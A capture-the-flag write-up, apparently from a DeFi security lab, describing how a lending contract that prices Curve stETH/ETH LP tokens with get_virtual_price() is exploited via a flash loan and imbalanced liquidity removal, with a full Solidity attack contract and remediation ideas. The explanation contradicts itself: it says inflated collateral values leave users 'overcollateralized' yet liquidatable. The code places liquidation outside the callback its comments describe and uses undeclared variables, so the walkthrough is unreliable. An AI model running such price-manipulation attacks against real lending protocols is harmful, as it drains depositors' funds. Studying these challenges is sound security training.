# Challenge #18: Curvy Puppet

- **Difficulty:** Hard
- **Category:** LP Token Price Manipulation via Curve Virtual Price
- **Severity:** Critical
- **Status:** SOLVED ✅

## Overview

`CurvyPuppetLending` accepts Curve LP tokens (stETH/ETH) as collateral. It prices these LP tokens using a formula: `ETH price × curvePool.get_virtual_price()`. The protocol allows liquidation of undercollateralized positions.

## Vulnerability

`curvePool.get_virtual_price()` is **not manipulation-resistant**. It represents the ratio of the pool's total value to the total LP supply, and can be inflated by:

1. Adding a massive amount of liquidity to the pool (increasing total value)
2. Removing liquidity in an imbalanced way (taking out more of one asset than the other)

The virtual price increases because the pool's curve formula doesn't perfectly track the underlying asset ratio after imbalanced operations.

```solidity
// Lending protocol's LP pricing (vulnerable):
function getCollateralValue() public view returns (uint256) {
    uint256 virtualPrice = curvePool.get_virtual_price();
    return (lpBalance * ethPrice * virtualPrice) / 1e18;
}
```

## Exploit Walkthrough

```solidity
contract CurvyAttacker {
    IAavePool constant AAVE = IAavePool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    ICurvePool constant CURVE = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IPermit2 constant PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    IWstETH constant WSTETH = IWstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    IERC20 constant STETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);
    IWETH9 constant WETH = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    
    address[] users;  // [alice, bob, charlie]
    
    function attack(address treasury) external {
        // Step 1: Flash loan 160,000 wstETH from Aave
        AAVE.flashLoan(address(this), [wstETH], [160_000e18], [0], address(this), "", 0);
    }
    
    function executeOperation(address[], uint256[] amounts, uint256[] premiums,
                              address, bytes calldata) external returns (bool) {
        // Step 2: Unwrap wstETH to stETH
        wstETH.unwrap(amounts[0]);
        
        // Step 3: Withdraw attacker's WETH from treasury as ETH
        weth.withdraw(WETH.balanceOf(address(this)));
        
        // Step 4: Add massive liquidity to Curve pool (ETH + stETH)
        CURVE.add_liquidity{value: ethAmount}([ethAmount, stETHAmount], 0);
        
        // Step 5: Remove liquidity imbalanced (take out only ETH)
        // This inflates get_virtual_price()
        CURVE.remove_liquidity_imbalance([ethAmountOut, 0], type(uint256).max);
        
        // Step 6: Liquidate Alice, Bob, and Charlie during callback
        for (uint256 i = 0; i < users.length; i++) {
            lending.liquidate(users[i]);
        }
        
        // Step 7: Rewrap stETH to wstETH
        wstETH.wrap(STETH.balanceOf(address(this)));
        
        // Step 8: Repay flash loan + fee
        wstETH.transfer(address(AAVE), amounts[0] + premiums[0]);
        
        // Step 9: Transfer recovered DVT to treasury
        dvt.transfer(treasury, dvt.balanceOf(address(this)));
        
        return true;
    }
    
    // Permit2 approval during Curve callback
    function receive() external payable {
        // Approve LP tokens to Permit2 for lending protocol
        lpToken.approve(address(PERMIT2), type(uint256).max);
        PERMIT2.approve(address(lpToken), address(lending), type(uint160).max, uint48(block.timestamp + 1));
    }
}
```

The attack flow:
1. Flash loan 160k wstETH → unwrap to stETH
2. Add massive liquidity to Curve (inflates pool)
3. Remove imbalanced (extracts more value than contributed)
4. `get_virtual_price()` is now artificially high
5. All three users are now "overcollateralized" (their LP tokens are worth more on paper)
6. Liquidate them — the protocol thinks they're underwater but the inflated price triggers liquidation
7. Recover their collateral, repay flash loan, keep the profit

## Real-World Impact

- **Curve/Convex manipulation attacks**: Multiple protocols using Curve LP tokens as collateral have been exploited via virtual price manipulation
- **Yearn Finance** vault manipulation: Similar principle of inflating share price via strategic deposits/withdrawals
- **Uranium Finance** (April 2021, $57M): Stableswap invariant manipulation

## Remediation

```solidity
// FIX 1: Use time-averaged virtual price
function getTWAPVirtualPrice(uint256 window) internal view returns (uint256) {
    // Sample virtual_price at two points separated by window
    // Return average to resist manipulation
}

// FIX 2: Use external oracle for LP token pricing
// FIX 3: Add slippage checks: reject if virtual_price deviates > X% from expected
// FIX 4: Use minimum of (virtual_price, 1e18) to prevent upward manipulation
```

## Key Takeaway

> **`get_virtual_price()` is NOT an oracle. It can be manipulated by strategic liquidity operations. Always time-average LP token prices or use external price feeds for collateral valuation.**
